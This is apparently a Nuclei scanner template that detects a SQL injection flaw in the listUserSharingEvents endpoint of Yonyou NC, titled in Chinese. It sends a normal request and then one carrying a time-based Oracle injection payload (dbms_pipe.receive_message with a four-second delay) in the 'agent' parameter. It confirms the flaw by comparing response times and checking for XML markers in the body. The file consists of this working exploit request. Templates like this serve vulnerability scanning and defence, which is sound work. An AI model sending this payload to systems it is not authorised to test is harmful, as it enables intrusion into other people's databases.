id: yonyou-nc-listusersharingevents-sqli

info:
  name: 用友NC listUserSharingEvents 接口存在SQL注入漏洞
  author: yonyou
  severity: high
  tags: yonyou

http:
  - raw:
      - |+
        GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate

      - |+
        GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1')+AND+1=dbms_pipe.receive_message('RDS',4)--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate


    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_2 >= 4'
          - 'duration_1 < 2'
          - 'duration_2 < 6'
        condition: and
      - type: word
        part: body
        words:
          - '<share'
          - '<?xml'
        condition: and

